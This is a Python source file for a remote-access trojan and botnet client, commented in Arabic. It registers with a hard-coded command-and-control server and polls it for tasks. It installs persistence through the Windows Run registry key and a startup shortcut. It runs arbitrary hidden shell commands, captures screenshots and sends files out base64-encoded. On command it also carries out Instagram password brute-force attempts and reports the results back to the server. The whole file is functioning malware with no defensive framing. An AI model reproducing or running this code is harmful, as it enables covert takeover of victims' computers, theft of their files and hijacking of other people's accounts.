import requests
import os
import time
import socket
import platform
import subprocess
import base64
import sys
import threading
import json
import re

# ============================================================
# 🔴 الرابط ديالك (خليه بحال ما هو)
# ============================================================
C2_URL = "https://promal.onrender.com"

BOT_ID = socket.gethostname() + "_" + os.getenv('USERNAME', 'user')
current_directory = os.getcwd()
VERSION = "6.0-Brute"

# ========== الثبات ==========
def install_persistence():
    try:
        script_path = os.path.abspath(sys.argv[0])
        reg_cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysHelper /t REG_SZ /d "{script_path}" /f'
        os.system(reg_cmd)
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        startup_script = os.path.join(startup_folder, 'syshelper.lnk')
        if not os.path.exists(startup_script):
            vbs_code = f'''
Set WshShell = CreateObject("WScript.Shell")
Set shortcut = WshShell.CreateShortcut("{startup_script}")
shortcut.TargetPath = "{script_path}"
shortcut.WorkingDirectory = "{os.path.dirname(script_path)}"
shortcut.Save
'''
            with open("tmp_startup.vbs", "w") as f:
                f.write(vbs_code)
            os.system("cscript tmp_startup.vbs")
            os.remove("tmp_startup.vbs")
        return True
    except:
        return False

# ========== تصوير الشاشة ==========
def take_screenshot():
    try:
        from PIL import ImageGrab
        import io
        screenshot = ImageGrab.grab()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        return base64.b64encode(img_bytes.getvalue()).decode('utf-8')
    except:
        return "[ERROR] Screenshot failed"

# ========== تحميل الملفات ==========
def download_file(filepath):
    try:
        if not os.path.exists(filepath):
            return f"[ERROR] File not found: {filepath}"
        with open(filepath, 'rb') as f:
            data = f.read()
        return f"[FILE] {filepath} ({len(data)} bytes)\n" + base64.b64encode(data).decode('utf-8')
    except Exception as e:
        return f"[ERROR] Cannot read file: {e}"

# ========== 🔥 دالة Brute Force على Instagram ==========
def instagram_bruteforce(target, password):
    """
    تحاول الدخول إلى Instagram باستخدام الباسوورد المعطى.
    ترجع (success, message).
    تستعمل الـ IP و User-Agent الحقيقيين للجهاز.
    """
    try:
        session = requests.Session()
        
        # نضبط User-Agent حقيقي (مش متغير)
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "X-IG-App-ID": "1217981644879628",
            "Content-Type": "application/x-www-form-urlencoded",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.instagram.com/"
        })
        
        # نجيب CSRF Token
        resp = session.get("https://www.instagram.com/")
        csrf_token = None
        # نبحث عن الـ CSRF في النص
        match = re.search(r'"csrf_token":"([^"]+)"', resp.text)
        if match:
            csrf_token = match.group(1)
        else:
            return False, "CSRF Token not found"
        
        # نجهز بيانات الدخول
        time_now = int(time.time())
        enc_pass = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}"
        
        login_data = {
            "username": target,
            "enc_password": enc_pass,
            "queryParams": json.dumps({}),
            "optIntoOneTap": "false"
        }
        
        session.headers.update({"X-CSRFToken": csrf_token})
        
        # نرسل الطلب
        login_resp = session.post(
            "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
            data=login_data,
            timeout=15
        )
        
        # نحلل النتيجة
        result = login_resp.json()
        if result.get("authenticated"):
            return True, "Login Successful!"
        elif result.get("two_factor_required"):
            return False, "2FA Required (Partial Success)"
        elif result.get("user") is False:
            return False, "Invalid User"
        else:
            error_msg = result.get("message", "Unknown error")
            return False, f"Failed: {error_msg}"
            
    except Exception as e:
        return False, f"Exception: {str(e)}"

# ========== تنفيذ الأوامر العادية (CMD/PowerShell) ==========
def execute_normal_command(cmd, cwd):
    try:
        CREATE_NO_WINDOW = 0x08000000
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            cwd=cwd,
            creationflags=CREATE_NO_WINDOW,
            encoding='utf-8',
            errors='ignore'
        )
        stdout, stderr = process.communicate(timeout=20)
        output = stdout + stderr
        if not output.strip():
            output = "[EXECUTED]"
        return output
    except subprocess.TimeoutExpired:
        process.kill()
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR] {e}"

# ========== البداية ==========
threading.Thread(target=install_persistence, daemon=True).start()

registered = False
while not registered:
    try:
        requests.post(f"{C2_URL}/register", json={
            "id": BOT_ID,
            "os": platform.system()
        }, timeout=4)
        registered = True
    except:
        time.sleep(3)

# ========== الحلقة الرئيسية ==========
while True:
    try:
        resp = requests.get(f"{C2_URL}/get_task", params={"id": BOT_ID}, timeout=4)
        
        if resp.status_code == 200:
            cmd_data = resp.json()
            cmd = cmd_data.get("command", "").strip()
            
            # نفحص إذا كان الأمر هو "bruteforce" (صيغة JSON)
            if cmd == "bruteforce":
                target = cmd_data.get("target", "")
                password = cmd_data.get("password", "")
                task_id = cmd_data.get("task_id", "")
                
                if target and password:
                    # ننفذ هجوم Brute Force
                    success, message = instagram_bruteforce(target, password)
                    
                    # نرجع النتيجة للسيرڤر
                    try:
                        requests.post(f"{C2_URL}/bruteforce/report", json={
                            "bot_id": BOT_ID,
                            "task_id": task_id,
                            "success": success,
                            "message": message,
                            "password": password
                        }, timeout=4)
                    except:
                        pass
                continue  # نروح للدورة التالية
            
            elif cmd:
                # الأوامر الخاصة (cd, screenshot, download, persist)
                output = ""
                if cmd.lower().startswith("cd "):
                    try:
                        new_path = cmd[3:].strip()
                        if not new_path:
                            new_path = os.path.expanduser("~")
                        os.chdir(new_path)
                        current_directory = os.getcwd()
                        output = f"[CWD] {current_directory}"
                    except Exception as e:
                        output = f"Error: {e}"
                
                elif cmd.lower() == "screenshot":
                    output = take_screenshot()
                
                elif cmd.lower().startswith("download "):
                    file_path = cmd[9:].strip()
                    output = download_file(file_path)
                
                elif cmd.lower() == "persist":
                    if install_persistence():
                        output = "[PERSIST] Done."
                    else:
                        output = "[PERSIST] Failed."
                
                else:
                    output = execute_normal_command(cmd, current_directory)
                
                try:
                    requests.post(f"{C2_URL}/send_result", json={
                        "id": BOT_ID,
                        "output": output,
                        "cwd": current_directory
                    }, timeout=4)
                except:
                    pass
    except:
        pass
    time.sleep(1)
